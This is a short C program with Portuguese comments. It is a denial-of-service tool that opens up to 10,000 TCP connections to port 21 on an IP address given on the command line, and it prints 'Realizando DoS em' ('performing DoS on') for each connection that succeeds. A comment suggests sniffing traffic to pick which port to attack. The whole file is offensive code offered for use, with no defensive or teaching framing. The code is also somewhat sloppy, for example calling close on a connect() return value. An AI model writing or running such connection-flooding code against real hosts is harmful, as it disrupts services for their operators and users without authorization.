#include <stdio.h>
#include <sys/socket.h>
#include <netdb.h>

int main(int argc, char *argv[]){

	int meusocket;
	int conecta;
	int num_conexoes = 10000; // conexoes por porta
	char *destino;
	destino = argv[1];	
		
	struct sockaddr_in alvo;
	
	for(int i =0; i < num_conexoes; i++){
		meusocket = socket(AF_INET,SOCK_STREAM,0);
		alvo.sin_family = AF_INET;
		alvo.sin_port = htons(21); //utilizar o sniffing p saber qual porta atacar
		alvo.sin_addr.s_addr = inet_addr(destino); //alvo
	
		conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo); 
		if(conecta == 0){
			printf("Realizando DoS em %s \n", destino);
} 		else {
			close(meusocket);
			close(conecta);
}		

}
}
